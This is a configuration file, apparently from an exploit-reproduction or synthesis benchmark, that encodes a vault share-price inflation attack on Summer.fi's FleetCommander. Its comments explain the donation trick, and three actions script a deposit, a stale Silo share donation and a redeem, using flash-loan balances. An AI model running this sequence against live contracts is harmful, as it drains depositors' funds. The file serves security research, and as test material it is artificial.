@@ -1,0 +1,65 @@
+# Lazy Summer Protocol exploit (Summer.fi), 6 Jul 2026, block 25471348 (~$6.04M).
+# A real exploit rediscovery (like harvest/euler), not an exploratory analysis. The
+# FleetCommander (ERC4626 USDC vault) prices shares off the sum of its Arks' totalAssets().
+# A stale, offboarded-but-active Silo ark values donated Silo shares at an impaired-yet-high
+# rate, so DONATING pre-accumulated Silo shares into it inflates the vault NAV ~9.5%; shares
+# minted before the donation redeem at the inflated price. See attack.t.sol + README.md.
+
+name = "lazy_summer"
+contract = "Lazy_Summer"    # --match-contract name in attack.t.sol
+chain = "ETH"
+block = 25471347            # the block just before the exploit tx (block 25471348)
+max_synthesis_len = 4
+
+
+# Profit is realized entirely in USDC. The donated Silo shares are impaired (~free capital the
+# attacker pre-accumulated cheap), so they are not counted against profit.
+profit_tokens = ["USDC"]
+
+[initial_balances]
+USDC = 70000000        # flash-loan capital for the deposit leg
+SILO = 30000000000     # 3e16 raw stale Silo shares (whole-share units), pre-accumulated
+LVUSDC = 0             # FleetCommander shares, minted by the deposit action
+
+[token_prices]
+USDC = 1.0
+SILO = 0.0             # impaired Silo shares — real value ~0 (not a profit token)
+LVUSDC = 1.0           # intermediate vault share (not a profit token)
+
+# token -> [contract variable in the harness, decimals]. All three are 6-decimal.
+[token_info]
+USDC = ["USDC", 6]
+LVUSDC = ["FLEET", 6]
+SILO = ["SILO", 6]
+
+# ----------------------------------------------------------------------------
+# Deposit USDC into the FleetCommander -> mint LVUSDC shares at the honest price.
+[[actions]]
+name = "fleet_deposit"
+tokens_in = ["USDC"]
+tokens_out = ["LVUSDC"]
+range = [0, 65000000]
+solidity = "FLEET.deposit($$ * 1e6, attacker);"
+
+# Donate pre-accumulated stale Silo shares directly into the offboarded-but-active Silo ark.
+# This raises ark.totalAssets() = siloVault.convertToAssets(balanceOf(ark)) -> vault NAV up.
+# No token is received; the donated Silo amount is the measured (spent) quantity. Its NAV
+# effect surfaces through the redeem action's larger USDC output in the sampled sequences.
+[[actions]]
+name = "donate_silo"
+tokens_in = ["SILO"]
+tokens_out = []
+range = [0, 30000000000]
+solidity = "SILO.transfer(ARK, $$ * 1e6);"
+effects = [
+  { token = "SILO", op = "sub", src = "collected" },
+]
+
+# Redeem LVUSDC shares -> USDC at the (now inflated) NAV. Bounded by the vault's withdrawable
+# liquidity; oversized redeems revert and are skipped by the collector.
+[[actions]]
+name = "fleet_redeem"
+tokens_in = ["LVUSDC"]
+tokens_out = ["USDC"]
+range = [0, 70000000]
+solidity = "FLEET.redeem($$ * 1e6, attacker, attacker);"
